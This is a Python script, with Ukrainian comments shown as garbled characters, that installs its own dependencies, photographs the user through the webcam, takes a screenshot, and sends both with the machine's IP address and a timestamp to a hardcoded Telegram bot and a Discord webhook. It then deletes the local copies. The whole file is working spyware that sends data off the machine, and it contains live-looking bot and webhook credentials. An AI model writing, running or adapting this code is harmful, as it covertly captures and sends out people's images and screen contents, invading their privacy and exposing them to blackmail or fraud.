import subprocess
import sys
from datetime import datetime
import os
import socket
from mss import mss
from telebot.types import InputMediaPhoto
import pycountry
import time
import requests
import shutil

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –±—ñ–±–ª—ñ–æ—Ç–µ–∫
def install_packages():
    required_packages = ['opencv-python', 'pyautogui', 'pyTelegramBotAPI', 'Pillow', 'mss', 'pycountry', 'requests']
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            print(f"–í—Å—Ç–∞–Ω–æ–≤–ª—é—î–º–æ {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "--force-reinstall", package])

# –í—Å—Ç–∞–Ω–æ–≤–ª—é—î–º–æ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –ø–µ—Ä–µ–¥ —ñ–º–ø–æ—Ä—Ç–æ–º
install_packages()

# –Ü–º–ø–æ—Ä—Ç –±—ñ–±–ª—ñ–æ—Ç–µ–∫ –ø—ñ—Å–ª—è —ó—Ö –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è
import cv2
import pyautogui
import telebot

# –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è Telegram-–±–æ—Ç–∞
TELEGRAM_TOKEN = '8069626352:AAGxaNC_LS50uklNG9s8Lwy-CBYracGFJxE'
CHAT_ID = '5950905655'
bot = telebot.TeleBot(TELEGRAM_TOKEN)

# –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è Discord webhook
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1381212631398092862/Z8ugozkkWoUsLZ5Ml4uftNjvnBzzikPywkRmYvkTpBgCse_QiMy__1LhXg-qMVHuWdjG'

# –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∏–º—á–∞—Å–æ–≤–æ—ó –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—ó
TEMP_DIR = os.path.join(os.getenv('TEMP', 'C:\\Temp'))
os.makedirs(TEMP_DIR, exist_ok=True)

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è IP-–∞–¥—Ä–µ—Å–∏
def get_ip_address():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
        print(f"–û—Ç—Ä–∏–º–∞–Ω–∞ IP-–∞–¥—Ä–µ—Å–∞: {ip_address}")
        return ip_address
    except Exception as e:
        error_msg = f"–ü–æ–º–∏–ª–∫–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è IP: {str(e)}"
        print(error_msg)
        return error_msg

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –∫—Ä–∞—ó–Ω–∏ —Ç–∞ –ø—Ä–∞–ø–æ—Ä–∞
def get_country_info(ip):
    country_codes = {
        '192.168.0.': ('UA', 'üá∫üá¶'),
        '172.16.': ('US', 'üá∫üá∏'),
    }
    for ip_range, (code, flag) in country_codes.items():
        if ip.startswith(ip_range):
            country = pycountry.countries.get(alpha_2=code).name
            return country, flag
    return "–ù–µ–≤—ñ–¥–æ–º–∞ –∫—Ä–∞—ó–Ω–∞", "üåê"

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –∑–Ω—ñ–º–∫—É –∑ –≤–µ–±-–∫–∞–º–µ—Ä–∏
def capture_webcam():
    print("–°–ø—Ä–æ–±–∞ –≤—ñ–¥–∫—Ä–∏—Ç–∏ –≤–µ–±-–∫–∞–º–µ—Ä—É...")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("–ü–æ–º–∏–ª–∫–∞: –ù–µ –≤–¥–∞–ª–æ—Å—è –≤—ñ–¥–∫—Ä–∏—Ç–∏ –≤–µ–±-–∫–∞–º–µ—Ä—É. –ü–µ—Ä–µ–≤—ñ—Ä –¥–æ—Å—Ç—É–ø –∞–±–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è.")
        return None
    ret, frame = cap.read()
    if not ret:
        print("–ü–æ–º–∏–ª–∫–∞: –ù–µ –≤–¥–∞–ª–æ—Å—è –∑—á–∏—Ç–∞—Ç–∏ –∫–∞–¥—Ä –∑ –≤–µ–±-–∫–∞–º–µ—Ä–∏.")
        cap.release()
        return None
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = os.path.join(TEMP_DIR, f'webcam_{timestamp}.jpg')
    cv2.imwrite(filename, frame)
    cap.release()
    print(f"–ó—Ä–æ–±–ª–µ–Ω–æ –∑–Ω—ñ–º–æ–∫ –≤–µ–±-–∫–∞–º–µ—Ä–∏: {filename}")
    return filename

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è —Å–∫—Ä—ñ–Ω—à–æ—Ç–∞ –µ–∫—Ä–∞–Ω—É
def capture_screenshot():
    print("–°–ø—Ä–æ–±–∞ –∑—Ä–æ–±–∏—Ç–∏ —Å–∫—Ä—ñ–Ω—à–æ—Ç...")
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(TEMP_DIR, f'screenshot_{timestamp}.jpg')
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        print(f"–ó—Ä–æ–±–ª–µ–Ω–æ —Å–∫—Ä—ñ–Ω—à–æ—Ç —á–µ—Ä–µ–∑ PyAutoGUI: {filename}")
        return filename
    except Exception as e:
        print(f"–ü–æ–º–∏–ª–∫–∞ –∑ PyAutoGUI: {str(e)}")
        try:
            sct = mss()
            filename = os.path.join(TEMP_DIR, f'screenshot_{timestamp}.jpg')
            screenshot = sct.shot(output=filename)
            print(f"–ó—Ä–æ–±–ª–µ–Ω–æ —Å–∫—Ä—ñ–Ω—à–æ—Ç —á–µ—Ä–µ–∑ MSS: {filename}")
            return filename
        except Exception as e_mss:
            print(f"–ü–æ–º–∏–ª–∫–∞ –∑ MSS: {str(e_mss)}")
            return None

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª—ñ–≤ —É Telegram
def send_to_telegram(webcam_file, screenshot_file):
    ip_address = get_ip_address()
    country, flag = get_country_info(ip_address)
    caption = f"–ó–Ω—ñ–º–æ–∫ –≤–µ–±-–∫–∞–º–µ—Ä–∏ —Ç–∞ —Å–∫—Ä—ñ–Ω—à–æ—Ç | IP: {ip_address} | –ö—Ä–∞—ó–Ω–∞: {country} {flag} | –ß–∞—Å: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    media = []
    photo_objects = []
    if webcam_file and os.path.exists(webcam_file):
        photo = open(webcam_file, 'rb')
        media.append(InputMediaPhoto(media=photo, caption=caption if not media else None))
        photo_objects.append(photo)
    if screenshot_file and os.path.exists(screenshot_file):
        photo = open(screenshot_file, 'rb')
        media.append(InputMediaPhoto(media=photo))
        photo_objects.append(photo)

    if media:
        try:
            bot.send_media_group(CHAT_ID, media=media)
            print("–£—Å–ø—ñ—à–Ω–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –∑–Ω—ñ–º–æ–∫ –≤–µ–±-–∫–∞–º–µ—Ä–∏ —Ç–∞ —Å–∫—Ä—ñ–Ω—à–æ—Ç –¥–æ Telegram")
        except Exception as e:
            error_msg = f"–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏: {str(e)}"
            print(error_msg)
            bot.send_message(CHAT_ID, f"–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏. IP: {ip_address}. –î–µ—Ç–∞–ª—ñ: {str(e)}")
        finally:
            time.sleep(1)
            for photo in photo_objects:
                photo.close()
    else:
        error_msg = "–ù–µ –≤–¥–∞–ª–æ—Å—è –∑–Ω–∞–π—Ç–∏ –∑–Ω—ñ–º–æ–∫ –≤–µ–±-–∫–∞–º–µ—Ä–∏ –∞–±–æ —Å–∫—Ä—ñ–Ω—à–æ—Ç"
        print(error_msg)
        bot.send_message(CHAT_ID, f"{error_msg}. IP: {ip_address}")

# –§—É–Ω–∫—Ü—ñ—è –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª—ñ–≤ —É Discord
def send_to_discord(webcam_file, screenshot_file):
    ip_address = get_ip_address()
    country, flag = get_country_info(ip_address)
    caption = f"–ó–Ω—ñ–º–æ–∫ –≤–µ–±-–∫–∞–º–µ—Ä–∏ —Ç–∞ —Å–∫—Ä—ñ–Ω—à–æ—Ç | IP: {ip_address} | –ö—Ä–∞—ó–Ω–∞: {country} {flag} | –ß–∞—Å: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

    files = []
    temp_files = []
    if webcam_file and os.path.exists(webcam_file):
        temp_webcam = os.path.join(TEMP_DIR, f'temp_webcam_{os.path.basename(webcam_file)}')
        shutil.copy(webcam_file, temp_webcam)
        files.append(('file1', open(temp_webcam, 'rb')))
        temp_files.append(temp_webcam)
        print(f"–î–æ–¥–∞–Ω–æ —Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª –≤–µ–±-–∫–∞–º–µ—Ä–∏: {temp_webcam}, —Ä–æ–∑–º—ñ—Ä: {os.path.getsize(temp_webcam)} –±–∞–π—Ç")
    if screenshot_file and os.path.exists(screenshot_file):
        temp_screenshot = os.path.join(TEMP_DIR, f'temp_screenshot_{os.path.basename(screenshot_file)}')
        if not shutil.copy(screenshot_file, temp_screenshot):
            print(f"–ü–æ–º–∏–ª–∫–∞ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è —Å–∫—Ä—ñ–Ω—à–æ—Ç–∞: {temp_screenshot}")
        else:
            files.append(('file2', open(temp_screenshot, 'rb')))
            temp_files.append(temp_screenshot)
            print(f"–î–æ–¥–∞–Ω–æ —Ç–∏–º—á–∞—Å–æ–≤–∏–π —Ñ–∞–π–ª —Å–∫—Ä—ñ–Ω—à–æ—Ç–∞: {temp_screenshot}, —Ä–æ–∑–º—ñ—Ä: {os.path.getsize(temp_screenshot)} –±–∞–π—Ç")

    if files:
        try:
            payload = {'content': caption}
            response = requests.post(DISCORD_WEBHOOK_URL, files=files, data=payload)
            if response.status_code in (200, 204):
                print("–£—Å–ø—ñ—à–Ω–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –∑–Ω—ñ–º–æ–∫ –≤–µ–±-–∫–∞–º–µ—Ä–∏ —Ç–∞ —Å–∫—Ä—ñ–Ω—à–æ—Ç –¥–æ Discord")
            else:
                print(f"–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –¥–æ Discord: {response.status_code} {response.text}")
        except Exception as e:
            print(f"–ü–æ–º–∏–ª–∫–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –¥–æ Discord: {str(e)}")
        finally:
            for _, file_obj in files:
                file_obj.close()
            for temp_file in temp_files:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
    else:
        print("–ù–µ –≤–¥–∞–ª–æ—Å—è –∑–Ω–∞–π—Ç–∏ –∑–Ω—ñ–º–æ–∫ –≤–µ–±-–∫–∞–º–µ—Ä–∏ –∞–±–æ —Å–∫—Ä—ñ–Ω—à–æ—Ç –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –¥–æ Discord")

# –û—Å–Ω–æ–≤–Ω–∞ –ø—Ä–æ–≥—Ä–∞–º–∞
def main():
    print("–ü–æ—á–∞—Ç–æ–∫ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏")
    # –ó–Ω—ñ–º–æ–∫ —ñ–∑ –≤–µ–±-–∫–∞–º–µ—Ä–∏
    webcam_file = capture_webcam()
    # –°–∫—Ä—ñ–Ω—à–æ—Ç –µ–∫—Ä–∞–Ω—É
    screenshot_file = capture_screenshot()
    # –í—ñ–¥–ø—Ä–∞–≤–∫–∞ –æ–±–æ—Ö —Ñ–∞–π–ª—ñ–≤ —Ä–∞–∑–æ–º
    send_to_telegram(webcam_file, screenshot_file)
    send_to_discord(webcam_file, screenshot_file)
    # –í–∏–¥–∞–ª–µ–Ω–Ω—è –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ –ø—ñ—Å–ª—è –≤—Å—ñ—Ö –≤—ñ–¥–ø—Ä–∞–≤–æ–∫
    for f in [webcam_file, screenshot_file]:
        if f and os.path.exists(f):
            os.remove(f)
    print("–ü—Ä–æ–≥—Ä–∞–º–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞. –ù–∞—Ç–∏—Å–Ω–∏ Enter –¥–ª—è –∑–∞–∫—Ä–∏—Ç—Ç—è...")
    input()

if __name__ == "__main__":
    main()